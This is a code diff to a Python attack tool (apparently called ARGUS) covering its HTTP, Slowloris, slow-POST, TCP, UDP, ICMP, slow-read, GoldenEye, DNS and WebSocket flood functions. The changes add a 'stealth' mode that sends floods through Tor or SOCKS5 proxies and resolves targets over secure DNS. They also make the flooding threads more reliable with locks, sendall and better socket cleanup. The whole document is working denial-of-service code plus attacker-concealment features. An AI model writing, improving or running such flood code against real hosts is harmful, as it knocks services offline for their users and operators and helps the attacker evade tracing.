@@ -6844,9 +6844,24 @@ def http_flood():
     print_row("Duration", f"{duration}s")
     print_warn("Press Ctrl+C to stop early\n")
 
+    # Stealth: route HTTP through proxy if enabled
+    proxies = None
+    if STEALTH["enabled"]:
+        ptype = STEALTH["proxy_type"]
+        phost = STEALTH["proxy_host"]
+        pport = STEALTH["proxy_port"]
+        if ptype == "tor":
+            proxy_url = f"socks5h://{phost}:{pport}"
+        elif ptype == "socks5":
+            proxy_url = f"socks5h://{phost}:{pport}"
+        else:
+            proxy_url = f"http://{phost}:{pport}"
+        proxies = {"http": proxy_url, "https": proxy_url}
+
     stop_event = threading.Event()
     counter = [0]  # mutable for threads
     errors = [0]
+    lock = threading.Lock()
     start_time = time.time()
 
     user_agents = [
@@ -6859,6 +6874,8 @@ def http_flood():
 
     def flood_worker():
         session = requests.Session()
+        if proxies:
+            session.proxies.update(proxies)
         while not stop_event.is_set():
             try:
                 headers = {
@@ -6876,9 +6893,13 @@ def http_flood():
                     sep = "&" if "?" in url else "?"
                     cache_bust = f"{sep}_={random.randint(100000,999999)}"
                     session.get(url + cache_bust, headers=headers, timeout=5, verify=False)
-                counter[0] += 1
+                with lock:
+                    counter[0] += 1
             except Exception:
-                errors[0] += 1
+                with lock:
+                    errors[0] += 1
+                if not stop_event.is_set():
+                    time.sleep(0.05)
 
     stats_thread = threading.Thread(target=_stress_stats, args=("HTTP FLOOD", stop_event, counter, start_time))
     stats_thread.daemon = True
@@ -6929,7 +6950,18 @@ def slowloris():
         print_err("Invalid numbers")
         return
 
-    print_row("Target", f"{target}:{port}")
+    # Stealth: resolve via DNS-over-HTTPS if enabled
+    try:
+        if STEALTH["enabled"] and dns is not None:
+            answers = dns.resolver.resolve(target, "A", lifetime=10)
+            resolved_ip = str(answers[0])
+        else:
+            resolved_ip = socket.gethostbyname(target)
+    except Exception:
+        print_err("Could not resolve hostname")
+        return
+
+    print_row("Target", f"{target}:{port} ({resolved_ip})")
     print_row("Sockets", str(num_sockets))
     print_row("Duration", f"{duration}s")
     print_warn("Press Ctrl+C to stop early\n")
@@ -6945,7 +6977,7 @@ def slowloris():
                 ctx.check_hostname = False
                 ctx.verify_mode = _ssl.CERT_NONE
                 s = ctx.wrap_socket(s, server_hostname=target)
-            s.connect((target, port))
+            s.connect((resolved_ip, port))
             s.send(f"GET /?{random.randint(0,9999)} HTTP/1.1\r\n".encode())
             s.send(f"Host: {target}\r\n".encode())
             ua = f"User-Agent: Mozilla/5.0 (ARGUS Slowloris {random.randint(0,9999)})\r\n"
@@ -7046,6 +7078,17 @@ def slow_post():
         host, port = host.rsplit(":", 1)
         port = int(port)
 
+    # Stealth: resolve via secure DNS if enabled
+    try:
+        if STEALTH["enabled"] and dns is not None:
+            answers = dns.resolver.resolve(host, "A", lifetime=10)
+            resolved_ip = str(answers[0])
+        else:
+            resolved_ip = socket.gethostbyname(host)
+    except Exception:
+        print_err("Could not resolve hostname")
+        return
+
     print_row("Target", url)
     print_row("Connections", str(conns))
     print_row("Duration", f"{duration}s")
@@ -7056,12 +7099,14 @@ def slow_post():
 
     stop_event = threading.Event()
     counter = [0]
+    lock = threading.Lock()
     start_time = time.time()
 
     fake_len = random.randint(10000, 100000)
 
     def rudy_worker():
         while not stop_event.is_set():
+            s = None
             try:
                 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                 s.settimeout(5)
@@ -7070,7 +7115,7 @@ def slow_post():
                     ctx.check_hostname = False
                     ctx.verify_mode = _ssl.CERT_NONE
                     s = ctx.wrap_socket(s, server_hostname=host)
-                s.connect((host, port))
+                s.connect((resolved_ip, port))
 
                 header = (
                     f"POST {path} HTTP/1.1\r\n"
@@ -7080,22 +7125,26 @@ def slow_post():
                     f"Content-Length: {fake_len}\r\n"
                     f"Connection: keep-alive\r\n\r\n"
                 )
-                s.send(header.encode())
-                counter[0] += 1
+                s.sendall(header.encode())
+                with lock:
+                    counter[0] += 1
 
                 # Send body one byte at a time
                 while not stop_event.is_set():
                     byte = random.choice(string.ascii_lowercase).encode()
                     s.send(byte)
-                    counter[0] += 1
+                    with lock:
+                        counter[0] += 1
                     time.sleep(random.uniform(5, 15))
             except Exception:
-                pass
+                if not stop_event.is_set():
+                    time.sleep(0.1)
             finally:
-                try:
-                    s.close()
-                except Exception:
-                    pass
+                if s:
+                    try:
+                        s.close()
+                    except Exception:
+                        pass
 
     stats_thread = threading.Thread(target=_stress_stats, args=("SLOW POST", stop_event, counter, start_time))
     stats_thread.daemon = True
@@ -7163,21 +7212,31 @@ def tcp_flood():
     stop_event = threading.Event()
     counter = [0]
     errors = [0]
+    lock = threading.Lock()
     start_time = time.time()
 
     def tcp_worker():
         while not stop_event.is_set():
+            s = None
             try:
                 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                 s.settimeout(3)
                 s.connect((ip, port))
-                # Send random data
-                data = bytes(random.getrandbits(8) for _ in range(random.randint(64, 1024)))
-                s.send(data)
-                counter[0] += 1
-                s.close()
+                data = os.urandom(random.randint(64, 1024))
+                s.sendall(data)
+                with lock:
+                    counter[0] += 1
             except Exception:
-                errors[0] += 1
+                with lock:
+                    errors[0] += 1
+                if not stop_event.is_set():
+                    time.sleep(0.05)
+            finally:
+                if s:
+                    try:
+                        s.close()
+                    except Exception:
+                        pass
 
     stats_thread = threading.Thread(target=_stress_stats, args=("TCP FLOOD", stop_event, counter, start_time))
     stats_thread.daemon = True
@@ -7251,19 +7310,24 @@ def udp_flood():
     stop_event = threading.Event()
     counter = [0]
     bytes_sent = [0]
+    lock = threading.Lock()
     start_time = time.time()
 
     def udp_worker():
         sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        payload = bytes(random.getrandbits(8) for _ in range(pkt_size))
-        while not stop_event.is_set():
-            try:
-                sock.sendto(payload, (ip, port))
-                counter[0] += 1
-                bytes_sent[0] += pkt_size
-            except Exception:
-                pass
-        sock.close()
+        payload = os.urandom(pkt_size)
+        try:
+            while not stop_event.is_set():
+                try:
+                    sock.sendto(payload, (ip, port))
+                    with lock:
+                        counter[0] += 1
+                        bytes_sent[0] += pkt_size
+                except Exception:
+                    if not stop_event.is_set():
+                        time.sleep(0.05)
+        finally:
+            sock.close()
 
     stats_thread = threading.Thread(target=_stress_stats, args=("UDP FLOOD", stop_event, counter, start_time))
     stats_thread.daemon = True
@@ -7353,7 +7417,7 @@ def icmp_flood():
         checksum = 0
         identifier = random.randint(0, 65535)
         sequence = random.randint(0, 65535)
-        payload = bytes(random.getrandbits(8) for _ in range(payload_size))
+        payload = os.urandom(payload_size)
         header = struct.pack("!BBHHH", icmp_type, icmp_code, checksum, identifier, sequence)
         checksum = _checksum(header + payload)
         header = struct.pack("!BBHHH", icmp_type, icmp_code, checksum, identifier, sequence)
@@ -7362,23 +7426,31 @@ def icmp_flood():
     stop_event = threading.Event()
     counter = [0]
     errors = [0]
+    lock = threading.Lock()
     start_time = time.time()
 
     def icmp_worker():
         try:
             sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
         except PermissionError:
-            errors[0] += 1
+            with lock:
+                errors[0] += 1
             return
 
-        while not stop_event.is_set():
-            try:
-                packet = build_icmp_packet(pkt_size)
-                sock.sendto(packet, (ip, 0))
-                counter[0] += 1
-            except Exception:
-                errors[0] += 1
-        sock.close()
+        try:
+            while not stop_event.is_set():
+                try:
+                    packet = build_icmp_packet(pkt_size)
+                    sock.sendto(packet, (ip, 0))
+                    with lock:
+                        counter[0] += 1
+                except Exception:
+                    with lock:
+                        errors[0] += 1
+                    if not stop_event.is_set():
+                        time.sleep(0.05)
+        finally:
+            sock.close()
 
     stats_thread = threading.Thread(target=_stress_stats, args=("ICMP FLOOD", stop_event, counter, start_time))
     stats_thread.daemon = True
@@ -7447,6 +7519,17 @@ def http_slow_read():
         host, port_s = host.rsplit(":", 1)
         port = int(port_s)
 
+    # Stealth: resolve via secure DNS if enabled
+    try:
+        if STEALTH["enabled"] and dns is not None:
+            answers = dns.resolver.resolve(host, "A", lifetime=10)
+            resolved_ip = str(answers[0])
+        else:
+            resolved_ip = socket.gethostbyname(host)
+    except Exception:
+        print_err("Could not resolve hostname")
+        return
+
     print_row("Target", url)
     print_row("Connections", str(conns))
     print_row("Read Rate", f"{read_rate} byte(s)/sec")
@@ -7459,10 +7542,12 @@ def http_slow_read():
     stop_event = threading.Event()
     counter = [0]  # bytes read
     active = [0]
+    lock = threading.Lock()
     start_time = time.time()
 
     def slow_reader():
         while not stop_event.is_set():
+            s = None
             try:
                 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                 s.settimeout(10)
@@ -7471,8 +7556,9 @@ def http_slow_read():
                     ctx.check_hostname = False
                     ctx.verify_mode = _ssl.CERT_NONE
                     s = ctx.wrap_socket(s, server_hostname=host)
-                s.connect((host, port))
-                active[0] += 1
+                s.connect((resolved_ip, port))
+                with lock:
+                    active[0] += 1
 
                 request = (
                     f"GET {path} HTTP/1.1\r\n"
@@ -7481,7 +7567,7 @@ def http_slow_read():
                     f"Accept: */*\r\n"
                     f"Connection: keep-alive\r\n\r\n"
                 )
-                s.send(request.encode())
+                s.sendall(request.encode())
 
                 # Read response extremely slowly
                 s.settimeout(30)
@@ -7489,13 +7575,20 @@ def http_slow_read():
                     data = s.recv(read_rate)
                     if not data:
                         break
-                    counter[0] += len(data)
+                    with lock:
+                        counter[0] += len(data)
                     time.sleep(1)
 
-                active[0] -= 1
-                s.close()
             except Exception:
-                active[0] = max(0, active[0] - 1)
+                pass
+            finally:
+                with lock:
+                    active[0] = max(0, active[0] - 1)
+                if s:
+                    try:
+                        s.close()
+                    except Exception:
+                        pass
 
     stats_thread = threading.Thread(target=_stress_stats, args=("SLOW READ", stop_event, counter, start_time))
     stats_thread.daemon = True
@@ -7557,6 +7650,17 @@ def goldeneye():
         host, port_s = host.rsplit(":", 1)
         port = int(port_s)
 
+    # Stealth: resolve via secure DNS if enabled
+    try:
+        if STEALTH["enabled"] and dns is not None:
+            answers = dns.resolver.resolve(host, "A", lifetime=10)
+            resolved_ip = str(answers[0])
+        else:
+            resolved_ip = socket.gethostbyname(host)
+    except Exception:
+        print_err("Could not resolve hostname")
+        return
+
     print_row("Target", url)
     print_row("Workers", str(workers_n))
     print_row("Sockets/Worker", str(sockets_per))
@@ -7569,6 +7673,7 @@ def goldeneye():
 
     stop_event = threading.Event()
     counter = [0]
+    lock = threading.Lock()
     start_time = time.time()
 
     user_agents = [
@@ -7597,7 +7702,7 @@ def goldeneye():
                         ctx.check_hostname = False
                         ctx.verify_mode = _ssl.CERT_NONE
                         s = ctx.wrap_socket(s, server_hostname=host)
-                    s.connect((host, port))
+                    s.connect((resolved_ip, port))
                     sockets.append(s)
                 except Exception:
                     break
@@ -7618,8 +7723,9 @@ def goldeneye():
                         f"Connection: keep-alive\r\n"
                         f"Keep-Alive: timeout={random.randint(30,120)}\r\n\r\n"
                     )
-                    s.send(request.encode())
-                    counter[0] += 1
+                    s.sendall(request.encode())
+                    with lock:
+                        counter[0] += 1
                 except Exception:
                     sockets.remove(s)
                     try:
@@ -7679,11 +7785,23 @@ def dns_flood():
     duration = input(f"  {Y}Duration seconds [30]:{RST} ").strip()
     duration = min(300, max(1, int(duration))) if duration.isdigit() else 30
 
-    print(f"\n  {Y}Flooding {target} with DNS queries for {duration}s ({threads_n} threads)...{RST}")
+    # Stealth: resolve target DNS server IP via secure DNS if enabled
+    try:
+        if STEALTH["enabled"] and dns is not None:
+            answers = dns.resolver.resolve(target, "A", lifetime=10)
+            resolved_ip = str(answers[0])
+        else:
+            resolved_ip = socket.gethostbyname(target)
+    except Exception:
+        # target might already be an IP
+        resolved_ip = target
+
+    print(f"\n  {Y}Flooding {resolved_ip} with DNS queries for {duration}s ({threads_n} threads)...{RST}")
     print(f"  {W}Press Ctrl+C to stop{RST}\n")
 
     stop_event = threading.Event()
     counter = [0]
+    lock = threading.Lock()
     start_time = time.time()
 
     def build_dns_query(domain_name):
@@ -7700,15 +7818,19 @@ def dns_flood():
     def worker():
         s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
         s.settimeout(1)
-        while not stop_event.is_set():
-            try:
-                rand_sub = ''.join(random.choices(string.ascii_lowercase, k=8))
-                query = build_dns_query(f"{rand_sub}.{domain}")
-                s.sendto(query, (target, 53))
-                counter[0] += 1
-            except Exception:
-                pass
-        s.close()
+        try:
+            while not stop_event.is_set():
+                try:
+                    rand_sub = ''.join(random.choices(string.ascii_lowercase, k=8))
+                    query = build_dns_query(f"{rand_sub}.{domain}")
+                    s.sendto(query, (resolved_ip, 53))
+                    with lock:
+                        counter[0] += 1
+                except Exception:
+                    if not stop_event.is_set():
+                        time.sleep(0.05)
+        finally:
+            s.close()
 
     stats_thread = threading.Thread(target=_stress_stats, args=("DNS", stop_event, counter, start_time))
     stats_thread.daemon = True
@@ -7762,12 +7884,8 @@ def websocket_flood():
     msg_size = input(f"  {Y}Message size bytes [1024]:{RST} ").strip()
     msg_size = min(65536, max(1, int(msg_size))) if msg_size.isdigit() else 1024
 
-    print(f"\n  {Y}Flooding {target} for {duration}s ({threads_n} connections)...{RST}")
-    print(f"  {W}Press Ctrl+C to stop{RST}\n")
-
-    stop_event = threading.Event()
-    counter = [0]
-    start_time = time.time()
+    import ssl as _ssl
+    import base64 as _b64
 
     parsed = urlparse(target)
     host = parsed.hostname
@@ -7786,13 +7904,21 @@ def websocket_flood():
         print_err("Could not resolve hostname")
         return
 
+    print(f"\n  {Y}Flooding {target} for {duration}s ({threads_n} connections)...{RST}")
+    print(f"  {W}Press Ctrl+C to stop{RST}\n")
+
+    stop_event = threading.Event()
+    counter = [0]
+    lock = threading.Lock()
+    start_time = time.time()
+
     def ws_worker():
         while not stop_event.is_set():
+            s = None
             try:
                 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                 s.settimeout(5)
                 if use_ssl:
-                    import ssl as _ssl
                     ctx = _ssl.create_default_context()
                     ctx.check_hostname = False
                     ctx.verify_mode = _ssl.CERT_NONE
@@ -7801,7 +7927,6 @@ def websocket_flood():
 
                 # WebSocket handshake
                 key = ''.join(random.choices(string.ascii_letters, k=16))
-                import base64 as _b64
                 ws_key = _b64.b64encode(key.encode()).decode()
                 handshake = (
                     f"GET {path} HTTP/1.1\r\n"
@@ -7811,16 +7936,16 @@ def websocket_flood():
                     f"Sec-WebSocket-Key: {ws_key}\r\n"
                     f"Sec-WebSocket-Version: 13\r\n\r\n"
                 )
-                s.send(handshake.encode())
+                s.sendall(handshake.encode())
                 s.recv(1024)
 
                 # Send frames
                 while not stop_event.is_set():
-                    payload = random.randbytes(msg_size) if hasattr(random, 'randbytes') else bytes(random.getrandbits(8) for _ in range(msg_size))
-                    # Build WebSocket text frame
+                    payload = os.urandom(msg_size)
+                    # Build WebSocket binary frame
                     frame = bytearray()
-                    frame.append(0x81)  # FIN + text opcode
-                    mask_key = bytes([random.randint(0, 255) for _ in range(4)])
+                    frame.append(0x82)  # FIN + binary opcode
+                    mask_key = os.urandom(4)
                     if msg_size <= 125:
                         frame.append(0x80 | msg_size)
                     elif msg_size <= 65535:
@@ -7832,16 +7957,19 @@ def websocket_flood():
                     frame.extend(mask_key)
                     masked = bytes(b ^ mask_key[i % 4] for i, b in enumerate(payload))
                     frame.extend(masked)
-                    s.send(frame)
-                    counter[0] += 1
+                    s.sendall(frame)
+                    with lock:
+                        counter[0] += 1
 
             except Exception:
-                pass
+                if not stop_event.is_set():
+                    time.sleep(0.05)
             finally:
-                try:
-                    s.close()
-                except Exception:
-                    pass
+                if s:
+                    try:
+                        s.close()
+                    except Exception:
+                        pass
 
     stats_thread = threading.Thread(target=_stress_stats, args=("WS-FLOOD", stop_event, counter, start_time))
     stats_thread.daemon = True
